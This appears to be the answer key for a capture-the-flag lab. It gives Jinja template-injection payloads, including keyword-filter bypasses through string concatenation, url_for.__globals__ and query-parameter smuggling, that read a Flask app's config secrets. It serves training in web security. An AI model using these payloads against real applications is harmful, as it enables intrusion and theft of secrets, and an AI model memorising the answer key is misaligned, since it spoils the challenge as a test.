# WAF-SMASHER v2.0 - Official Solutions

**SPOILER WARNING:** This file contains the direct solutions for all stages. Try your best to solve them on your own before reading!

---

### Stage 1: Initial Breach
The validator performs a direct string comparison. The payload must be the literal string itself.
```
{{7*7}}
```
---
### Stage 2: The Decoy
The challenge provides a decoy flag file as a trap. The real flag is in the application's config object. The WAF for this stage is non-existent.
```jinja
{{ self.config.FLAG }}
```
---
### Stage 3: Restricted Environment
The WAF blocks `config`, `self`, and `request`. We pivot off a Flask-native global function, `url_for`, to get the `current_app` context. We then bypass the `config` blacklist by building the string at runtime.
```jinja
{{ url_for.__globals__['current_app']['con'~'fig']['FLAG'] }}
```
---
### Stage 4: Forbidden Arts
The WAF now blocks `__globals__` and other dangerous names. Based on the hint from Stage 3, we know we can smuggle forbidden strings in the URL's query parameters.

**Step 1:** Modify the URL to include a "smuggled" string:
```
http://127.0.0.1:5000/stage/4?g=__globals__
```

**Step 2:** Use a payload that accesses this smuggled string via `request.args`:
```jinja
{{ url_for[request.args.g]['current_app']['con'~'fig']['FLAG'] }}
```
This payload is now "clean" and will pass the WAF, as the forbidden string `__globals__` is never in the form body.